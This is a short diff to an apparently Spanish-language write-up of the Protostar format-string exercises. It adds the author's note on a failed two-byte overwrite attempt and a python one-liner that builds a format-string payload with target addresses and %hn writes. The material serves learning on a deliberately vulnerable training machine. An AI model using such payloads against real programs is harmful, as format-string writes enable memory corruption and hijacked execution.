@@ -399,6 +399,10 @@ $19 = 33616 -> Esto es para el segundo argumento (el primero se queda como antes
 code execution redirected! you win
 ```
 
-
+Probe a hacer la tecnica de los 2 bytes con el format 3 pero me pasaba de largo (salia 55445544 y debia ser 1025544)
+Asi que en vez de restar la segunda mitad habia que restar la primera 
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%4$hn%5$hn")' > /tmp/pattern
+```
 
 
